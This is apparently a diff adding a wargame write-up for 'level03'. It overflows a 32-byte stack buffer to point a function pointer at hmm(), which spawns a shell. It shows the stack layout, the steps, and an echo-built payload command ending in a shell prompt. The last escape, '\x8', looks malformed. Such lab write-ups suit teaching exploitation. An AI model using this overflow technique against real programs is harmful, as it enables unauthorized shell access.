@@ -1,0 +1,24 @@
+./level03 test
+Address of hmm: 0x80484c0
+
+---------------------------------------
+The address above is the address to hmm(), which is function that spawns a new shell.
+Stack layout for local variables is as follows:
+
+Offset	Length	Variable
+0	4	i
+4	4	limit
+8	4	fptr
+12	4	hmmptr
+16	32	buf
+
+Lets overflow buf to override the address that fptr points to (we want it to use the address of hmm()):
+1. Fill up buf with 32 bytes of arbitary data
+2. Add another 4 bytes of arbitary data that will override hmmptr as well, but that is corrected in the code itselves
+3. Finally, add another 4 bytes that overrides the function call of fptr() to hmm()
+
+---------------------------------------
+
+./level03 `echo -e -n "012345678901234567890123456789123456\xc0\x84\x04\x8"`
+Win.
+sh-4.2$ 
